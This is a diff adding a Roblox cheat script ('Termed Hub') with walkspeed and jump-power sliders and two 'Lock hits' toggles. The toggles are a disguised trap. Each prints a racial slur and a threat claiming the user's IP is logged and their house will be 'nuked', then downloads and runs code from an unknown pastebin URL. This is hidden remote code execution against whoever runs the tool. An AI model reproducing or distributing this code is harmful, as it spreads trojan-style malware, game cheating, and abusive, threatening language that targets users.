@@ -1,0 +1,62 @@
+if game.PlaceId == 2788229376 then
+    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+    local Window = Library.CreateLib("Termed Hub", "Sentinel")
+ 
+    -- MAIN
+    local Main = Window:NewTab("Main")
+    local MainSection = Main:NewSection("Main")
+
+
+    -- PLAYER
+    local Player = Window:NewTab("Player")
+    local PlayerSection = Player:NewSection("Player")
+ 
+    PlayerSection:NewSlider("Walkspeed", "Changes the walkspeed", 250, 16, function(v)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
+    end)
+ 
+    PlayerSection:NewSlider("Jumppower", "Changes the jumppower", 250, 50, function(v)
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = v
+    end)
+
+MainSection:NewToggle("Lock 50% hits", "50% hits", function(state)
+    if state then
+local write = function(a) rconsoleprint("@@WHITE@@") rconsoleprint(a) end
+local writei = function(a) rconsoleprint("@@BLUE@@") rconsoleprint("[*]"..a) end
+local writew = function(a) rconsoleprint("@@YELLOW@@") rconsoleprint("[*]"..a.."\n") end
+local writee = function(a) rconsoleprint("@@RED@@") rconsoleprint(a) end
+
+rconsolename("IfYouExploitAgainAmGonnaNukeYourHouse")
+
+writee([[
+yo mama 123 have logged your ip nigga i'll nuke your house next week goodluck :)
+]])
+
+loadstring(game:HttpGet("https://pastebin.com/raw/wDh1eTdX"))()
+
+        print("Toggle On")
+    else
+        print("Toggle Off")
+    end
+end)
+
+MainSection:NewToggle("Lock 100% hits", "100% hits", function(state)
+    if state then
+local write = function(a) rconsoleprint("@@WHITE@@") rconsoleprint(a) end
+local writei = function(a) rconsoleprint("@@BLUE@@") rconsoleprint("[*]"..a) end
+local writew = function(a) rconsoleprint("@@YELLOW@@") rconsoleprint("[*]"..a.."\n") end
+local writee = function(a) rconsoleprint("@@RED@@") rconsoleprint(a) end
+
+rconsolename("IfYouExploitAgainAmGonnaNukeYourHouse")
+
+writee([[
+yo mama 123 have logged your ip nigga i'll nuke your house next week goodluck :)
+]])
+
+loadstring(game:HttpGet("https://pastebin.com/raw/wDh1eTdX"))()
+        print("Toggle On")
+    else
+        print("Toggle Off")
+    end
+end)
+end
